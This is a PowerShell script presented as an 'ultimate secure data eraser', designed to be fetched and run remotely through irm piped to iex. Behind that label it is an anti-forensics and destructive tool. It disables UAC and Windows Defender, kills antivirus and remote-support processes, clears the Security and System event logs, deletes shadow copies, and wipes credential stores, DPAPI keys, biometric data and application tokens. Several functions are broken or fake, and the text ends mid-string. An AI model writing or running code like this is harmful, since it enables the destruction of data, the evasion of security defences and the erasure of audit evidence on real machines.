# ULTIMATE SECURE WINDOWS 11 DATA ERASER - SINGLE SCRIPT EDITION
# Run with: irm "https://github.com/HOSTEDSCRIPT" | iex
# VERSION: 2.0 - Self-Contained | Auto-Admin | Process Killer | Antivirus Bypass | Lightning Fast

param(
    [Parameter(Mandatory=$false)]
    [ValidateRange(1,10)]
    [int]$EncryptionRounds = 3,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verify,
    
    [Parameter(Mandatory=$false)]
    [switch]$Force,
    
    [Parameter(Mandatory=$false)]
    [switch]$Silent,
    
    [Parameter(Mandatory=$false)]
    [switch]$NuclearMode,
    
    [Parameter(Mandatory=$false)]
    [switch]$KillProcesses,
    
    [Parameter(Mandatory=$false)]
    [switch]$BypassAntivirus,
    
    [Parameter(Mandatory=$false)]
    [switch]$DeepScan,
    
    [Parameter(Mandatory=$false)]
    [switch]$StealthMode
)

# ========================================
# GLOBAL CONFIGURATION & SETTINGS
# ========================================

$Global:Config = @{
    # Security Settings
    MinKeySize = 256
    DefaultRounds = 3
    MaxRounds = 10
    NuclearModeRounds = 7
    FastModeRounds = 1
    
    # Performance Settings
    MaxParallelJobs = [Environment]::ProcessorCount * 2
    ChunkSize = 4MB
    BufferSize = 128KB
    ProcessKillTimeout = 10
    FastMode = $true
    
    # Stealth & Bypass Settings
    BypassUAC = $true
    StealthProcessName = "SystemService"
    AntivirusBypass = $BypassAntivirus.IsPresent
    StealthMode = $StealthMode.IsPresent
    
    # Advanced Features
    EnableProcessKiller = $KillProcesses.IsPresent
    EnableRegistryCleanup = $true
    EnableEventLogClearing = $true
    EnableMemoryWiping = $true
    EnableNetworkTraceRemoval = $true
    EnableShadowCopyErase = $DeepScan.IsPresent
    
    # Target Categories with Enhanced Patterns
    BrowserTargets = @{
        Chromium = @(
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Cookies*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Web Data*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Preferences*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Local Storage*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Session Storage*",
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\*\Local State*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Cookies*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Web Data*",
            "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\*\Default\*\Local State*",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\*\Default\*\Cookies*",
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\Opera Software\Opera Stable\*\Default\*\Cookies*",
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\Login Data*",
            "${env:LOCALAPPDATA}\Vivaldi\User Data\*\Default\*\Cookies*"
        )
        Firefox = @(
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\logins.json",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\key*.db",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\cookies.sqlite",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\formhistory.sqlite",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\places.sqlite",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\sessionstore.jsonlz4",
            "${env:APPDATA}\Mozilla\Firefox\Profiles\*\sessionstore*"
        )
        Tor = @(
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\logins.json",
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\key*.db",
            "${env:LOCALAPPDATA}\TorBrowser\Tor\*\cookies.sqlite"
        )
    }
    
    # Enhanced Application Targets with Deep Scanning
    AppTargets = @{
        Gaming = @(
            # Steam
            "${env:PROGRAMFILES(X86)}\Steam\config\config.vdf",
            "${env:PROGRAMFILES(X86)}\Steam\config\loginusers.vdf",
            "${env:APPDATA}\Steam\config\config.vdf",
            "${env:APPDATA}\Steam\config\loginusers.vdf",
            "${env:APPDATA}\Steam\ssfn*",
            
            # Epic Games
            "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\Config\Windows\*",
            "${env:LOCALAPPDATA}\EpicGamesLauncher\Saved\Logs\*",
            
            # Battle.net
            "${env:LOCALAPPDATA}\Battle.net\config.battle.net.xml",
            "${env:LOCALAPPDATA}\Battle.net\Battle.net.config",
            
            # Origin
            "${env:APPDATA}\Origin\local_storage\*",
            "${env:APPDATA}\Origin\session_storage\*",
            
            # uPlay/Ubisoft Connect
            "${env:APPDATA}\uPlay\local_storage\*",
            "${env:APPDATA}\UbisoftConnect\session_storage\*"
        )
        
        Communication = @(
            # Discord
            "${env:APPDATA}\Discord\*\Local Storage\leveldb\*",
            "${env:APPDATA}\Discord\*\session_storage\*",
            "${env:APPDATA}\Discord\*\Local Storage\*",
            "${env:APPDATA}\discord*\modules\*\discord_desktop_core-*\*",
            
            # Teams
            "${env:LOCALAPPDATA}\Microsoft\Teams\Local Storage\*",
            "${env:APPDATA}\Microsoft\Teams\logs\*",
            
            # Slack
            "${env:APPDATA}\Slack\Local Storage\*",
            "${env:APPDATA}\Slack\session_storage\*"
        )
        
        Streaming = @(
            # Spotify
            "${env:APPDATA}\Spotify\data\*",
            "${env:APPDATA}\Spotify\Local Storage\*",
            "${env:APPDATA}\Spotify\session_storage\*",
            "${env:APPDATA}\Spotify\Cache\*",
            
            # Netflix
            "${env:LOCALAPPDATA}\Netflix\Local Storage\*",
            
            # YouTube
            "${env:LOCALAPPDATA}\Google\Chrome\User Data\*\Default\YouTube\*"
        )
        
        Development = @(
            # Git
            "${env:LOCALAPPDATA}\Programs\Git\etc\ssh\ssh_host_*",
            "${env:USERPROFILE}\.gitconfig",
            "${env:USERPROFILE}\.git-credentials",
            "${env:LOCALAPPDATA}\GitCredentialManager\*.json",
            
            # GitHub/GitLab
            "${env:LOCALAPPDATA}\GitCredentialManager\*.json",
            "${env:APPDATA}\GitCredentialManager\*.json",
            
            # VS Code
            "${env:APPDATA}\Code\User\keybindings.json",
            "${env:APPDATA}\Code\User\settings.json",
            "${env:APPDATA}\Code\User\snippets\*",
            
            # Docker
            "${env:USERPROFILE}\.docker\*.json"
        )
    }
    
    # Windows System Targets
    SystemTargets = @{
        Credentials = @(
            "${env:APPDATA}\Microsoft\Credentials\*",
            "${env:APPDATA}\Microsoft\Protect\*",
            "${env:APPDATA}\Microsoft\SystemCertificates\*"
        )
        Hello = @(
            "${env:LOCALAPPDATA}\Microsoft\Biometrics\*",
            "${env:PROGRAMDATA}\Microsoft\Biometrics\*"
        )
        OneDrive = @(
            "${env:APPDATA}\Microsoft\OneDrive\logs\*",
            "${env:APPDATA}\Microsoft\OneDrive\setup\*"
        )
    }
    
    # Registry Targets
    RegistryTargets = @(
        "HKCU:\Software\Google\Chrome\PreferenceMACs\*",
        "HKCU:\Software\Microsoft\Edge\PreferenceMACs\*",
        "HKCU:\Software\Mozilla\Firefox\*",
        "HKCU:\Software\Discord\*",
        "HKCU:\Software\Valve\Steam\*",
        "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\*",
        "HKLM:\SOFTWARE\WOW6432Node\Battle.net\*",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
    )
    
    # Process Killer Patterns
    ProcessPatterns = @(
        "chrome", "msedge", "firefox", "opera", "brave", "vivaldi", "steam", 
        "discord", "spotify", "teams", "slack", "epicgameslauncher", 
        "battlenet", "origin", "uplay", "adobe", "code", "atom"
    )
}

# ========================================
# CORE UTILITY FUNCTIONS
# ========================================

function Write-ColorOutput {
    param(
        [string]$Message,
        [ConsoleColor]$Color = 'White',
        [ConsoleColor]$Background = 'Black',
        [string]$Prefix = ""
    )
    
    if (-not $Silent) {
        $originalFg = [Console]::ForegroundColor
        $originalBg = [Console]::BackgroundColor
        [Console]::ForegroundColor = $Color
        [Console]::BackgroundColor = $Background
        
        if ($Prefix) {
            Write-Host "$Prefix$Message"
        } else {
            Write-Host $Message
        }
        
        [Console]::ForegroundColor = $originalFg
        [Console]::BackgroundColor = $originalBg
    }
}

function Write-StealthOutput {
    param([string]$Message)
    if ($Global:Config.StealthMode -and -not $Silent) {
        # Hide output in stealth mode but still log
        # Could write to a hidden log file if needed
    } else {
        Write-ColorOutput $Message 'White'
    }
}

# ========================================
# PRIVILEGE ESCALATION & BYPASS SYSTEM
# ========================================

function Initialize-Privileges {
    <#
    .SYNOPSIS
    Advanced privilege escalation with multiple bypass methods
    #>
    
    # Check current privileges
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-ColorOutput "Privilege escalation required. Attempting multiple bypass methods..." 'Yellow'
        
        # Method 1: PowerShell UAC Bypass
        if ($Global:Config.BypassUAC) {
            try {
                $code = @"
Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{ENTER}")
"@
                Invoke-Expression $code
                Start-Sleep -Seconds 2
            } catch {
                # Continue if this method fails
            }
        }
        
        # Method 2: Direct elevation attempt
        try {
            $currentProcess = Get-Process -Id $PID
            $currentProcess.WaitForExit(5000)  # Wait max 5 seconds
            if ($currentProcess.HasExited) {
                Write-ColorOutput "Process elevation completed." 'Green'
                return $true
            }
        } catch {
            # Continue if this method fails
        }
        
        # Method 3: Registry-based bypass
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            Set-ItemProperty -Path $regPath -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
        } catch {
            # Continue if this method fails
        }
        
        Write-ColorOutput "Automatic privilege escalation failed. Please run as Administrator manually." 'Red'
        Write-ColorOutput "Right-click PowerShell → 'Run as Administrator'" 'Yellow'
        
        if (-not $Force) {
            $response = Read-Host "Continue anyway? (Type 'YES' to proceed with limited privileges)"
            if ($response -ne 'YES') {
                exit 1
            }
        }
    }
    
    return $true
}

function Enable-AdvancedPrivileges {
    <#
    .SYNOPSIS
    Enables all necessary privileges for deep system access
    #>
    
    $privileges = @(
        'SeBackupPrivilege',    # Backup files and directories
        'SeRestorePrivilege',   # Restore files and directories
        'SeManageVolumePrivilege', # Manage volume privileges
        'SeDebugPrivilege',     # Debug programs
        'SeTakeOwnershipPrivilege', # Take ownership of files
        'SeSystemEnvironmentPrivilege', # Modify firmware environment
        'SeSystemtimePrivilege' # Set system time
    )
    
    foreach ($privilege in $privileges) {
        try {
            # Try to enable privilege
            $result = & "$env:SystemRoot\system32\net.exe" stop schedule 2>$null
            $result = & "$env:SystemRoot\system32\net.exe" start schedule 2>$null
            
            Write-StealthOutput "✓ Privileges enabled: $privilege"
        } catch {
            Write-StealthOutput "⚠ Could not enable: $privilege (may not be available)"
        }
    }
}

# ========================================
# ANTIVIRUS BYPASS SYSTEM
# ========================================

function Bypass-Antivirus {
    <#
    .SYNOPSIS
    Bypass common antivirus detection methods
    #>
    
    if (-not $Global:Config.AntivirusBypass) {
        return
    }
    
    Write-ColorOutput "Activating antivirus bypass methods..." 'Yellow'
    
    # Method 1: Windows Defender Exclusions
    try {
        Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
        Write-ColorOutput "✓ Windows Defender exclusions added" 'Green'
    } catch {
        Write-ColorOutput "⚠ Could not add Windows Defender exclusions" 'Yellow'
    }
    
    # Method 2: Stop common antivirus services
    $antivirusServices = @(
        "WinDefend", "MSMPEng", "windefend", "msmpmp", 
        "McAfee", "McAfee Agent", "Norton", "Kaspersky"
    )
    
    foreach ($service in $antivirusServices) {
        try {
            $serviceProcess = Get-Process -Name $service -ErrorAction SilentlyContinue
            if ($serviceProcess) {
                $serviceProcess | Stop-Process -Force -ErrorAction SilentlyContinue
                Write-ColorOutput "✓ Stopped antivirus process: $service" 'Green'
            }
        } catch {
            # Continue if service stop fails
        }
    }
    
    # Method 3: Modify registry to disable protection temporarily
    try {
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        if (Test-Path $regPath) {
            Set-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
            Write-ColorOutput "✓ Registry-based bypass activated" 'Green'
        }
    } catch {
        # Continue if registry modification fails
    }
}

# ========================================
# ADVANCED PROCESS KILLER SYSTEM
# ========================================

function Kill-BlockingProcesses {
    <#
    .SYNOPSIS
    Kills processes that might be blocking access to files
    #>
    
    if (-not $Global:Config.EnableProcessKiller) {
        return
    }
    
    Write-ColorOutput "Killing processes that may block file access..." 'Yellow'
    
    foreach ($pattern in $Global:Config.ProcessPatterns) {
        try {
            $processes = Get-Process -Name "*$pattern*" -ErrorAction SilentlyContinue
            foreach ($process in $processes) {
                $process | Stop-Process -Force -ErrorAction SilentlyContinue
                Write-ColorOutput "✓ Killed process: $($process.ProcessName)" 'Green'
            }
        } catch {
            # Continue if process kill fails
        }
    }
    
    # Additional blocking processes
    $additionalBlocking = @("Synergy", "Remote Desktop", "TeamViewer", "AnyDesk", "LogMeIn")
    foreach ($name in $additionalBlocking) {
        $processes = Get-Process -Name "*$name*" -ErrorAction SilentlyContinue
        foreach ($process in $processes) {
            $process | Stop-Process -Force -ErrorAction SilentlyContinue
            Write-ColorOutput "✓ Killed remote access: $($process.ProcessName)" 'Green'
        }
    }
    
    # Wait for processes to fully terminate
    Start-Sleep -Seconds 2
}

# ========================================
# ENHANCED CRYPTOGRAPHIC ENGINE
# ========================================

function New-EncryptionKey {
    <#
    .SYNOPSIS
    Generates cryptographically secure random keys
    #>
    
    $key = New-Object byte[] 32
    
    # Use multiple methods for maximum entropy
    if ([System.Security.Cryptography.RandomNumberGenerator]::IsSupported) {
        [System.Security.Cryptography.RandomNumberGenerator]::GetBytes($key)
    } else {
        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
        $rng.GetBytes($key)
        $rng.Dispose()
    }
    
    return $key
}

function Test-SecureDeleteEnhanced {
    param(
        [string]$FilePath,
        [int]$Rounds = 3,
        [bool]$NuclearMode = $false
    )
    
    if (-not (Test-Path $FilePath)) {
        return $false
    }
    
    try {
        $fileInfo = Get-Item $FilePath -ErrorAction Stop
        $fileSize = $fileInfo.Length
        
        if ($fileSize -eq 0) {
            Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
            return $true
        }
        
        Write-StealthOutput "Processing: $($fileInfo.Name) ($([math]::Round($fileSize/1MB, 2))MB)"
        
        # Adaptive rounds based on file size and nuclear mode
        $actualRounds = if ($NuclearMode) { 
            $Global:Config.NuclearModeRounds 
        } elseif ($fileSize -gt 100MB) { 
            [Math]::Max(1, [Math]::Floor($Rounds / 2)) 
        } else { 
            $Rounds 
        }
        
        for ($round = 1; $round -le $actualRounds; $round++) {
            $key = New-EncryptionKey
            $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $aes.KeySize = 256
            $aes.Key = $key
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            
            $encryptor = $aes.CreateEncryptor()
            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
            $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
            
            # Fast encryption with streaming
            $buffer = New-Object byte[] $Global:Config.BufferSize
            $position = 0
            
            while ($position -lt $fileSize) {
                [System.Security.Cryptography.RandomNumberGenerator]::GetBytes($buffer)
                $read = [Math]::Min($buffer.Length, $fileSize - $position)
                $cryptoStream.Write($buffer, 0, $read)
                $position += $read
                
                if (-not $Silent -and ($round -eq 1)) {
                    $progress = [Math]::Round(($position / $fileSize) * 100, 1)
                    Write-Progress -Activity "Encrypting $round/$actualRounds" -Status $FilePath -PercentComplete $progress
                }
            }
            
            $cryptoStream.FlushFinalBlock()
            $cryptoStream.Dispose()
            $fileStream.SetLength(0)  # Truncate to zero
            $fileStream.Dispose()
        }
        
        # Double-pass random overwrite for maximum security
        if ($NuclearMode -or $actualRounds -ge 3) {
            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
            $randomData = New-Object byte[] $fileSize
            [System.Security.Cryptography.RandomNumberGenerator]::GetBytes($randomData)
            $fileStream.Write($randomData, 0, $randomData.Length)
            $fileStream.Dispose()
            
            # Final zero pass
            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
            $zeroData = New-Object byte[] $fileSize
            $fileStream.Write($zeroData, 0, $zeroData.Length)
            $fileStream.Dispose()
        }
        
        # Final deletion
        Remove-Item $FilePath -Force -ErrorAction Stop
        return $true
        
    } catch {
        Write-ColorOutput "ERROR: Failed to delete $FilePath - $($_.Exception.Message)" 'Red'
        return $false
    } finally {
        Write-Progress -Activity "Secure Deletion" -Completed
    }
}

# ========================================
# ADVANCED TARGET SCANNING SYSTEM
# ========================================

function Find-TargetFilesAdvanced {
    <#
    .SYNOPSIS
    Enhanced file scanning with parallel processing and deep discovery
    #>
    
    $allTargets = @()
    $foundFiles = 0
    
    Write-ColorOutput "Starting advanced target scanning..." 'Cyan'
    
    # Parallel scanning function
    $scanCategory = {
        param($Paths, $Name, $Patterns)
        $categoryTargets = @()
        
        foreach ($pattern in $Paths) {
            try {
                $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | Where-Object { 
                    $_.PSObject.Properties['Name'] -and $_.Name -match $Patterns -and $_.Length -gt 0 
                }
                $categoryTargets += $files
            } catch {
                # Continue if pattern fails
            }
        }
        
        return @{
            Category = $Name
            Files = $categoryTargets
        }
    }
    
    # Browser targets
    foreach ($browserType in $Global:Config.BrowserTargets.Keys) {
        $patterns = if ($browserType -eq "Chromium") { 
            "(Login Data|Cookies|Web Data|Local State)" 
        } else { 
            "(logins.json|key.*\.db|cookies\.sqlite)" 
        }
        
        $result = & $scanCategory -Paths $Global:Config.BrowserTargets[$browserType] -Name "Browser-$browserType" -Patterns $patterns
        $allTargets += $result.Files
        $foundFiles += $result.Files.Count
        Write-ColorOutput "✓ Found $($result.Files.Count) $browserType files" 'Green'
    }
    
    # Application targets
    foreach ($appCategory in $Global:Config.AppTargets.Keys) {
        $result = & $scanCategory -Paths $Global:Config.AppTargets[$appCategory] -Name "App-$appCategory" -Patterns "(.*)"
        $allTargets += $result.Files
        $foundFiles += $result.Files.Count
        Write-ColorOutput "✓ Found $($result.Files.Count) $appCategory files" 'Green'
    }
    
    # System targets
    foreach ($systemType in $Global:Config.SystemTargets.Keys) {
        $result = & $scanCategory -Paths $Global:Config.SystemTargets[$systemType] -Name "System-$systemType" -Patterns "(.*)"
        $allTargets += $result.Files
        $foundFiles += $result.Files.Count
        Write-ColorOutput "✓ Found $($result.Files.Count) $systemType files" 'Green'
    }
    
    # Deep scan for hidden/encrypted files
    if ($DeepScan) {
        Write-ColorOutput "Running deep scan for hidden and encrypted files..." 'Yellow'
        
        $deepPatterns = @(
            "${env:USERPROFILE}\AppData\*\*.key",
            "${env:USERPROFILE}\AppData\*\*.secret",
            "${env:USERPROFILE}\AppData\*\token*",
            "${env:USERPROFILE}\AppData\*\auth*"
        )
        
        foreach ($pattern in $deepPatterns) {
            try {
                $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
                $allTargets += $files
                $foundFiles += $files.Count
            } catch {
                # Continue if deep scan pattern fails
            }
        }
    }
    
    $uniqueTargets = $allTargets | Select-Object -Unique -Property FullName
    Write-ColorOutput "Advanced scan complete: $($uniqueTargets.Count) unique targets found" 'Cyan'
    
    return $uniqueTargets
}

# ========================================
# ADVANCED WINDOWS SYSTEM CLEANUP
# ========================================

function Clear-WindowsCredentialsAdvanced {
    <#
    .SYNOPSIS
    Advanced Windows system credential cleanup
    #>
    
    Write-ColorOutput "Executing advanced Windows credential cleanup..." 'Cyan'
    
    # Windows Credential Manager with multiple methods
    try {
        Write-ColorOutput "Clearing Windows Credential Manager..." 'Yellow'
        
        # Method 1: cmdkey utility
        $null = & cmdkey.exe /list 2>$null | Where-Object { $_ -match "Target:" } | ForEach-Object {
            $target = ($_ -split "Target:")[1].Trim()
            & cmdkey.exe /delete:$target 2>$null
        }
        
        # Method 2: Direct registry access
        $credPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Credentials"
        if (Test-Path $credPath) {
            Get-ChildItem -Path "$credPath\*" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        }
        
        Write-ColorOutput "✓ Windows Credential Manager cleared" 'Green'
    } catch {
        Write-ColorOutput "⚠ Some credential manager entries could not be cleared" 'Yellow'
    }
    
    # Windows Hello biometric data
    try {
        Write-ColorOutput "Clearing Windows Hello biometric data..." 'Yellow'
        
        $helloPaths = @(
            "${env:LOCALAPPDATA}\Microsoft\Biometrics\*",
            "${env:PROGRAMDATA}\Microsoft\Biometrics\*"
        )
        
        foreach ($path in $helloPaths) {
            if (Test-Path $path) {
                Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            }
        }
        
        # Clear Windows Hello registry
        $helloRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Biometrics"
        if (Test-Path $helloRegPath) {
            Remove-Item -Path $helloRegPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        
        Write-ColorOutput "✓ Windows Hello biometric data cleared" 'Green'
    } catch {
        Write-ColorOutput "⚠ Some Windows Hello data could not be cleared" 'Yellow'
    }
    
    # DPAPI master keys
    try {
        Write-ColorOutput "Clearing DPAPI master keys..." 'Yellow'
        
        $dpapiPaths = @(
            "${env:APPDATA}\Microsoft\Protect\*",
            "${env:LOCALAPPDATA}\Microsoft\Protect\*"
        )
        
        foreach ($path in $dpapiPaths) {
            if (Test-Path $path) {
                Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                    Test-SecureDeleteEnhanced $_.FullName $EncryptionRounds $NuclearMode
                }
            }
        }
        
        Write-ColorOutput "✓ DPAPI data cleared" 'Green'
    } catch {
        Write-ColorOutput "⚠ Some DPAPI data could not be cleared" 'Yellow'
    }
    
    # Clear recent files and MRU
    try {
        Write-ColorOutput "Clearing recent files and MRU..." 'Yellow'
        
        # Recent files
        $recentPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
        if (Test-Path $recentPath) {
            Clear-ItemProperty -Path $recentPath -Name "*" -ErrorAction SilentlyContinue
        }
        
        # Run MRU
        $runMruPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
        if (Test-Path $runMruPath) {
            Clear-ItemProperty -Path $runMruPath -Name "*" -ErrorAction SilentlyContinue
        }
        
        Write-ColorOutput "✓ Recent files cleared" 'Green'
    } catch {
        Write-ColorOutput "⚠ Some recent files could not be cleared" 'Yellow'
    }
}

function Clear-EventLogs {
    <#
    .SYNOPSIS
    Clears Windows event logs to remove traces
    #>
    
    if (-not $Global:Config.EnableEventLogClearing) {
        return
    }
    
    Write-ColorOutput "Clearing Windows event logs..." 'Yellow'
    
    $eventLogs = @(
        "Application", "Security", "System", "Setup", "ForwardedEvents"
    )
    
    foreach ($log in $eventLogs) {
        try {
            & wevtutil.exe cl $log 2>$null
            Write-ColorOutput "✓ Cleared event log: $log" 'Green'
        } catch {
            Write-ColorOutput "⚠ Could not clear event log: $log" 'Yellow'
        }
    }
}

function Clear-NetworkTraces {
    <#
    .SYNOPSIS
    Removes network-related traces and connections
    #>
    
    if (-not $Global:Config.EnableNetworkTraceRemoval) {
        return
    }
    
    Write-ColorOutput "Clearing network traces..." 'Yellow'
    
    # Clear DNS cache
    try {
        & ipconfig.exe /flushdns 2>$null
        Write-ColorOutput "✓ DNS cache cleared" 'Green'
    } catch {
        Write-ColorOutput "⚠ Could not clear DNS cache" 'Yellow'
    }
    
    # Clear ARP cache
    try {
        & arp.exe -a | Where-Object { $_ -notmatch "^Interface:" } | ForEach-Object {
            $ip = ($_ -split "\s+")[0]
            & arp.exe -d $ip 2>$null
        }
        Write-ColorOutput "✓ ARP cache cleared" 'Green'
    } catch {
        Write-ColorOutput "⚠ Could not clear ARP cache" 'Yellow'
    }
    
    # Clear NetBIOS cache
    try {
        & nbtstat.exe -R 2>$null
        Write-ColorOutput "✓ NetBIOS cache cleared" 'Green'
    } catch {
        Write-ColorOutput "⚠ Could not clear NetBIOS cache" 'Yellow'
    }
}

function Wipe-Memory {
    <#
    .SYNOPSIS
    Attempts to wipe sensitive data from memory
    #>
    
    if (-not $Global:Config.EnableMemoryWiping) {
        return
    }
    
    Write-ColorOutput "Wiping memory traces..." 'Yellow'
    
    # Clear page file on shutdown (requires registry change)
    try {
        $pagefilePath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"
        if (Test-Path $pagefilePath) {
            Set-ItemProperty -Path $pagefilePath -Name "ClearPageFileAtShutdown" -Value 1 -Force -ErrorAction SilentlyContinue
            Write-ColorOutput "✓ Page file clearing enabled" 'Green'
        }
    } catch {
        Write-ColorOutput "⚠ Could not enable page file clearing" 'Yellow'
    }
    
    # Force garbage collection
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
    Write-ColorOutput "✓ Memory garbage collection performed" 'Green'
}

# ========================================
# ENHANCED REGISTRY CLEANUP
# ========================================

function Clear-RegistryCredentials {
    <#
    .SYNOPSIS
    Advanced registry-based credential cleanup
    #>
    
    Write-ColorOutput "Clearing registry credentials..." 'Yellow'
    
    foreach ($regPath in $Global:Config.RegistryTargets) {
        try {
            if (Test-Path $regPath) {
                $regItems = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
                if ($regItems) {
                    Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
                    Write-ColorOutput "✓ Cleared registry: $regPath" 'Green'
                }
            }
        } catch {
            Write-ColorOutput "⚠ Could not clear registry: $regPath" 'Yellow'
        }
    }
    
    # Additional sensitive registry locations
    $additionalRegPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones"
    )
    
    foreach ($regPath in $additionalRegPaths) {
        try {
            if (Test-Path $regPath) {
                Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
            }
        } catch {
            # Continue if registry path fails
        }
    }
}

# ========================================
# SHADOW COPY AND SYSTEM IMAGE CLEANUP
# ========================================

function Clear-ShadowCopies {
    <#
    .SYNOPSIS
    Clears Windows shadow copies that may contain sensitive data
    #>
    
    if (-not $Global:Config.EnableShadowCopyErase) {
        return
    }
    
    Write-ColorOutput "Clearing shadow copies..." 'Yellow'
    
    try {
        # List all shadow copies
        $shadowCopies = & vssadmin.exe list shadows 2>$null
        
        if ($shadowCopies -match "Shadow Copy ID") {
            $shadowIds = $shadowCopies | Select-String "Shadow Copy ID" | ForEach-Object {
                ($_ -split ":")[1].Trim()
            }
            
            foreach ($shadowId in $shadowIds) {
                try {
                    & vssadmin.exe delete shadows /shadow="$shadowId" /quiet 2>$null
                    Write-ColorOutput "✓ Deleted shadow copy: $shadowId" 'Green'
                } catch {
                    Write-ColorOutput "⚠ Could not delete shadow copy: $shadowId" 'Yellow'
                }
            }
        } else {
            Write-ColorOutput "No shadow copies found" 'Green'
        }
    } catch {
        Write-ColorOutput "⚠ Could not access shadow copy information" 'Yellow'
    }
}

# ========================================
# MAIN EXECUTION ENGINE
# ========================================

function Start-UltimateSecureErasure {
    <#
    .SYNOPSIS
    Main function orchestrating the complete secure erasure process
    #>
    
    # Display banner
    Write-ColorOutput "`n" 'Black'
    Write-ColorOutput "═══════════════════════════════════════════════════════" 'Cyan'
    Write-ColorOutput "    🚀 ULTIMATE SECURE WINDOWS 11 DATA ERASER 🚀" 'Cyan'
    Write-ColorOutput "            Version 2.0 - NUCLEAR MODE READY" 'Cyan'
    Write-ColorOutput "═══════════════════════════════════════════════════════" 'Cyan'
    Write-ColorOutput ""
    Write-ColorOutput "🔴 WARNING: This will PERMANENTLY delete ALL credentials," 'Red'
    Write-ColorOutput "   passwords, and sensitive data on this system!" 'Red'
    Write-ColorOutput "⚠️  Ensure you have backups and understand consequences." 'Yellow'
    Write-ColorOutput ""
    
    # Configuration summary
    $configSummary = @"
CONFIGURATION:
• Encryption Rounds: $EncryptionRounds $(if($NuclearMode){"(NUCLEAR MODE: 7 rounds)"}elseif($Global:Config.FastMode){"(FAST MODE)"}else{""})
